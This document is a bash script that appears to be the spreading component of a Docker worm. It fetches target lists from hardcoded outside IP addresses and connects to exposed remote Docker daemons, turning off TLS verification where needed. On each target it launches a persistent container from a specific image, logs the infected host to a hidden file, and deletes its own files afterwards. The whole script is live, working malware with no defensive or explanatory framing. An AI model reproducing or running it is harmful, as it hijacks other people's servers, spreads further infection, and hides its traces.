#/bin/bash
ipfile="ip"
if [ ! -f "$ipfile" ];then
    ipserver="180.76.109.52:10024 114.67.68.52:10024 118.24.109.67:10024 167.99.125.74:10024 139.199.173.43:10024"
    randon=`echo $(($RANDOM%6))`
    while [ $randon -eq 0 ]
    do
        randon=`echo $(($RANDOM%6))`
    done

    ipport=`echo $ipserver |cut -d " " -f $randon`
    timeout 10 curl -O http://$ipport/$ipfile
fi
 
#curl -O http://120.27.32.15:8989/ip


image="pocosow/centos:7.6.1810"

if [ -n "$localip" ];then
    meip=$localip
else
    meip=`curl ip.cip.cc`
fi

#port=2375
if [ -f "$ipfile" ];then
    iplines=`cat $ipfile |wc -l`
    randon=`echo $(($RANDOM%$iplines))`
    while [ $randon -eq 0 ]
    do
        randon=`echo $(($RANDOM%$iplines))`
    done
    ip=`sed -n ${randon}p ${ipfile}`
    echo $ip
    
    ipstr=`echo $ip | awk -F ":" '{print $1}'`
    port=`echo $ip | awk -F ":" '{print $2}'`
    #if [ "$port"x = "2375"x ];then
       
    otherarg=""
    error=$(timeout 10 docker -H ${ip} info 2>&1)
    r=$?
    if [ $r -ne 124 ];then
        if [ $r -eq 1 ];then
            if [ -n "$error" ] && [ "$error"x = "Error response from daemon: Client sent an HTTP request to an HTTPS server."x ];then
                otherarg="--tlsverify=false"
            fi
        fi
        sleep 3
        wormids=`timeout 10 docker -H ${ip} $otherarg ps -q -f ancestor=$image -f status=running 2>/dev/null`
        echo $wormids
        if [ -z "$wormids" ];then
            sleep 10
            proc=`cat /proc/cpuinfo | grep processor | wc -l`
            echo "docker -H ${ip} $otherarg run --restart unless-stopped -d $image"
            docker -H ${ip} $otherarg run --restart unless-stopped -e localip=${ip} -d $image 2>/dev/null \
            && echo ${proc}_${ipstr}_${port} >> /usr/local/test/.v1iplist_${meip} &
        fi

    fi
    
    
        
    #fi
fi

rm -rf ./ip
rm -rf ./worm.sh